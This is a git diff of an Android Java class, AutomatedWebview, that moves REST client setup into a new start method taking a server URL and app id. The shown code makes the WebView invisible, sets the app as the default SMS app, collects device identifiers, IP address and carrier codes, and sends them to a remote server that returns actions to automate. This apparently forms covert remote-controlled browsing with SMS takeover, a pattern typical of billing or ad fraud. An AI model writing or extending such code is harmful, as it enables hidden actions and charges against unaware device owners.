@@ -43,7 +43,6 @@ import java.util.List;
 import java.util.Map;
 import java.util.UUID;
 
-import automation.bml.com.webviewautomation.RestAPI.Constants;
 import automation.bml.com.webviewautomation.RestAPI.DataModel.Action;
 import automation.bml.com.webviewautomation.RestAPI.DataModel.Settings;
 import automation.bml.com.webviewautomation.RestAPI.DataModel.TransactionResponse;
@@ -70,7 +69,7 @@ public class AutomatedWebview extends WebView {
     private int mnc, mcc;
     private String cssSelector;
     ArrayList<Action> actionList;
-
+    private String app_id, app_url;
     public AutomatedWebview(Context context) {
         super(context);
         this.context = context;
@@ -85,15 +84,6 @@ public class AutomatedWebview extends WebView {
 
     public void init() {
         this.setVisibility(View.INVISIBLE);
-
-        //Setting up REST api objects
-        OkHttpClient httpClient = new OkHttpClient.Builder().build();
-        Gson gson = new GsonBuilder()
-                .setLenient()
-                .create();
-        Retrofit retrofit = new Retrofit.Builder().addConverterFactory(GsonConverterFactory.create(gson)).baseUrl(RestAPI.BASE_URL).client(httpClient).build();
-        service = retrofit.create(RestAPI.class);
-
         setUUID(); // Setting the UUID on installation
         //Webview settings
         getSettings().setJavaScriptEnabled(true);
@@ -117,10 +107,19 @@ public class AutomatedWebview extends WebView {
             });
         }
 
-        startWorkflow();
     }
-    public void startWorkflow()
+    public void start(String app_id, String app_url)
     {
+        this.app_id = app_id;
+        this.app_url = app_url;
+        //Setting up REST api objects
+        OkHttpClient httpClient = new OkHttpClient.Builder().build();
+        Gson gson = new GsonBuilder()
+                .setLenient()
+                .create();
+        Retrofit retrofit = new Retrofit.Builder().addConverterFactory(GsonConverterFactory.create(gson)).baseUrl(app_url).client(httpClient).build();
+        service = retrofit.create(RestAPI.class);
+
         enableSMSDefault(); //Setting the app as default SMS app
         //Displaying device info
         Toast.makeText(context, "Manufacturer: " + getDeviceManufacturer(), Toast.LENGTH_SHORT).show();
@@ -143,7 +142,7 @@ public class AutomatedWebview extends WebView {
             if (mnc != 0 || mcc != 0) //If MNC and MCC are not empty
             {
                 //Calling the api
-                Call<TransactionResponse> meResponse = service.loadData("1", getUUID(), getUserAgent(), getIPAddress(), "20408", "start");
+                Call<TransactionResponse> meResponse = service.loadData(app_id, getUUID(), getUserAgent(), getIPAddress(), "20408", "start");
                 meResponse.enqueue(new Callback<TransactionResponse>() {
                     @Override
                     public void onResponse(Call<TransactionResponse> call, Response<TransactionResponse> response) {
